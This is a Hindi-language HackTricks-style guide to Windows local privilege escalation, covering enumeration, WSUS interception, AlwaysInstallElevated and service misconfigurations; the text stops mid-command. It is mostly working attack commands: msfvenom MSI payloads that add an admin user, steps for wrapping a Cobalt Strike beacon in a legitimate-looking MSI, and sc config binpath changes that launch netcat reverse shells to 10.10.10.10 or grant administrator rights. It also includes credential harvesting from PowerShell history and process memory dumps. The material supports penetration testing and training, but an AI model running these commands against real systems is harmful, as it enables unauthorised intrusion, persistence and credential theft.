# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई ऐसी चीजें हैं जो आपको **सिस्टम को enumerating करने से रोक सकती हैं**, executables चलाने से रोक सकती हैं या यहाँ तक कि **आपकी गतिविधियों का पता लगा सकती हैं**। आपको निम्नलिखित **पृष्ठ** को **पढ़ना** चाहिए और privilege escalation enumeration शुरू करने से पहले इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी चेक करें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। यह डेटाबेस 4,700 से अधिक सुरक्षा कमजोरियाँ सूचीबद्ध करता है, जो Windows वातावरण द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy जानकारी env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

आप सीख सकते हैं कि इसे कैसे चालू करें: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन के विवरण रिकॉर्ड किए जाते हैं, जिनमें चलाए गए कमांड, कमांड इनवोकेशंस और स्क्रिप्ट के हिस्से शामिल हैं। हालांकि, पूरी निष्पादन जानकारी और आउटपुट परिणाम कैद नहीं हो सकते हैं।

इसे सक्षम करने के लिए, डाक्यूमेंटेशन के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs के पिछले 15 इवेंट देखने के लिए आप निम्नलिखित चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के execution की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे सुनिश्चित होता है कि प्रत्येक block of code उसके run होते समय document किया जाता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक audit trail संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए बेहद उपयोगी है। execution के समय सभी गतिविधियों को रिकॉर्ड करके प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग इवेंट्स Windows Event Viewer में इस पाथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

आप सिस्टम को compromise कर सकते हैं अगर अपडेट्स http**S** के बजाय http के जरिए अनुरोधित किए जाते हैं।

शुरू करने के लिए यह जांचें कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको ऐसा कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **यह शोषणयोग्य है।** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In order to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

रिसर्च यहाँ पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी रूप से, यह वही दोष है जिसका यह बग शोषण करता है:

> यदि हमारे पास अपने स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करते हैं, तो इसलिए हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को लोकल रूप से चलाने की क्षमता होगी ताकि हम अपनी ट्रैफ़िक को इंटरसेप्ट कर सकें और अपने एसेट पर एक elevated user के रूप में कोड चला सकें।
>
> इसके अलावा, चूंकि WSUS सेवा current user की settings का उपयोग करती है, यह उसकी certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और इस सर्टिफिकेट को current user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट करने में सक्षम होंगे। WSUS किसी HSTS-like mechanism का उपयोग करके certificate पर trust-on-first-use प्रकार की validation लागू नहीं करता। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और सही hostname है, तो सेवा इसे स्वीकार कर लेगी।

आप इस vulnerability का शोषण tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके कर सकते हैं (एक बार यह liberated होने पर)।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel एक्सपोज़ करते हैं। यदि enrollment को attacker server की ओर मजबूर किया जा सकता है और updater एक rogue root CA या weak signer checks पर भरोसा करता है, तो एक local user एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM service इंस्टॉल कर देता है। यहाँ एक सामान्यीकृत तकनीक देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** परिवेशों में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में उन वातावरणों का समावेश है जहाँ **LDAP signing लागू नहीं है,** उपयोगकर्ताओं के पास self-rights हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास domain के भीतर कंप्यूटर बनाने की क्षमता होती है। यह उल्लेखनीय है कि ये **requirements** **default settings** का उपयोग करके पूरी हो जाती हैं।

एक्सप्लॉइट यहाँ पाएँ: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

हमले के फ्लो के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्ट्री प्रविष्टियाँ **सक्षम** हैं (मान **0x1**), तो किसी भी privilege के उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter सत्र है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान निर्देशिका में अधिकार बढ़ाने के लिए एक Windows MSI बाइनरी बनाएं। यह स्क्रिप्ट एक precompiled MSI इंस्टॉलर लिखती है जो user/group जोड़ने का प्रॉम्प्ट दिखाती है (इसलिए आपको GIU access चाहिए):
```
Write-UserAddMSI
```
सिर्फ़ बनाए गए बाइनरी को चलाएँ ताकि privileges बढ़ाए जा सकें।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप यह सीख सकें कि इन tools का उपयोग करके MSI wrapper कैसे बनाते हैं। ध्यान दें कि आप एक "**.bat**" फ़ाइल को wrap कर सकते हैं अगर आप **केवल** कमांड लाइनें निष्पादित करना चाहते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** या **Metasploit** का उपयोग करके `C:\privesc\beacon.exe` में एक नया **Windows EXE TCP payload** जनरेट करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते जाएँ जब तक आप step 3 of 4 (choose files to include) पर न पहुँचें। **Add** पर क्लिक करें और अभी जनरेट किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाईलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। यह सुनिश्चित करेगा कि installer रन होते ही beacon payload निष्पादित हो।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, प्रोजेक्ट बिल्ड करें।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

दुर्भावनापूर्ण `.msi` फ़ाइल की **installation** बैकग्राउंड में निष्पादित करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं।
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को domain से जुड़े कंप्यूटरों पर **management of local Administrator passwords** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **unique, randomised, and regularly updated** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions प्रदान किए गए हों, जिससे वे अधिकृत होने पर local admin passwords देख सकें।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

**Windows 8.1** से, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी मेमोरी **पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोक दिया जा सके**, और इस प्रकार सिस्टम और अधिक सुरक्षित हो।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणीकृत होता है, तो आमतौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं。\  
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

आपको जांचना चाहिए कि क्या आप जिन समूहों में हैं उनमें से किसी के पास रोचक अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार समूहों और उन्हें दुरुपयोग करके विशेषाधिकार बढ़ाने के बारे में जानने के लिए यहाँ देखें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token हेरफेर

**और अधिक जानें** कि एक **token** क्या है इस पेज पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्न पेज देखें ताकि आप **दिलचस्प tokens** और उन्हें दुरुपयोग करने के बारे में जान सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग्ड उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## रनिंग प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रोसेसों को सूचीबद्ध करते समय **प्रोसेस की कमांड लाइन के अंदर पासवर्ड के लिए जाँच करें**।\
जाँच करें कि क्या आप किसी चल रही बाइनरी को **ओवरराइट कर सकते हैं** या बाइनरी फ़ोल्डर की लिखने की अनुमतियाँ हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) की जाँच करें.

**प्रोसेस बाइनरीज़ की अनुमतियों की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी चल रहे प्रोसेस का मेमोरी डम्प बना सकते हैं। FTP जैसी सेवाओं में **credentials in clear text in memory** होते हैं, मेमोरी डम्प करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाली एप्लिकेशन उपयोगकर्ता को CMD spawn करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकती हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers Windows को तब एक service शुरू करने देते हैं जब कुछ स्थितियाँ उत्पन्न होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers फायर करके शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
यह अनुशंसित है कि प्रत्येक सेवा के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ का बाइनरी **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जाँच करें क्या "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आप यह त्रुटि देख रहे हैं (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्नलिखित कमांड का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost को काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**Another workaround** इस समस्या के लिए निम्नलिखित चलाएं:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ संशोधित करें**

उस परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी सर्विस पर **SERVICE_ALL_ACCESS** है, सर्विस के executable binary को संशोधित करना संभव है। इसे संशोधित करने और **sc** को निष्पादित करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से बढ़ाया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: सर्विस बाइनरी को पुन: कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों को पुन: कॉन्फ़िगर करने में सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership हासिल करने और अनुमतियों को पुन: कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता शामिल होती है।
- **GENERIC_ALL**: यह भी service configurations बदलने की क्षमता शामिल करता है।

इस vulnerability का पता लगाने और exploit करने के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services बाइनरीज़ की कमजोर अनुमतियाँ

**जाँच करें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जो किसी service द्वारा चलायी जाती है** या क्या आपके पास उस फ़ोल्डर पर **write permissions** हैं जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी service द्वारा execute किए जाने वाले हर बाइनरी को **wmic** का उपयोग करके (system32 में नहीं) प्राप्त कर सकते हैं और अपनी permissions की जाँच **icacls** से कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

जांचें कि क्या आप किसी भी service registry को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी service **registry** पर अपनी **permissions** की **जाँच** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचा जाना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं। यदि हाँ, तो सेवा द्वारा निष्पादित binary को बदला जा सकता है।

निष्पादित binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **you can create sub registries from this one**। Windows services के मामले में यह **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows space से पहले के हर ending को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
built-in Windows services से संबंधित सेवाओं को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
